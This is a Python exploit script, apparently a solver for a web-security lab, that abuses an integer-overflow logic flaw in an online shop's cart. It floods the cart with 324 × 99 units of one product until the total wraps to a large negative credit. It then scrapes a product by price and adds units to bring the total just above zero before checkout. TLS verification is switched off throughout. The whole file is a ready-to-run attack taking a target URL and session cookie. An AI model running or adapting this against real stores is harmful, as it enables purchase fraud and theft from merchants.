import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_id_of_item(session, url, price):
    r = session.get(url, verify=False)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    wanted = price.replace("$", "").strip()

    for div in soup.find_all("div"):
        text = div.get_text(" ", strip=True).replace("$", "")
        if wanted in text:
            a = div.find("a", href=True)
            if a and "productId=" in a["href"]:
                return parse_qs(urlparse(a["href"]).query).get("productId", [None])[0]
    return None


def add_item(session: requests.Session, url: str):
    url = url.rstrip("/")
    s = input("Enter you session cookie: ")
    cookie = {"session": s}

    print("Adding items...")
    for i in range(324):
        requests.post(f"{url}/cart", cookies=cookie, data={"productId": "1", "redir": "PRODUCT", "quantity": "99"}, verify=False)
    print(f"(+) Added {324 * 99} jackets")
    total = 64060.96
    print(f"(+) Total jacket credit: -${total}")
     
    price = input("Enter the price of the item: ")
    item_id = get_id_of_item(session, url, price)
    if not item_id:
        raise RuntimeError("Could not find productId for that price.")
    print(f"(+) Id of the item is: {item_id}")

    needed_pieces = int(total / float(price))
    amount = needed_pieces * float(price) - total
    if amount < 0:
        needed_pieces += 1
    elif amount > 100:
        needed_pieces -= 1

    x = int(needed_pieces / 99)
    rest = needed_pieces - x * 99

    for j in range(x):
        requests.post(f"{url}/cart", cookies=cookie,
                  data={"productId": item_id, "redir": "PRODUCT", "quantity": "99"},
                  verify=False)
    requests.post(f"{url}/cart", cookies=cookie,
              data={"productId": item_id, "redir": "PRODUCT", "quantity": str(rest)},
              verify=False)
    print("(+) Items added successfully")
    print("(+) Go login and do checkout")

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    add_item(session, sys.argv[1])

main()

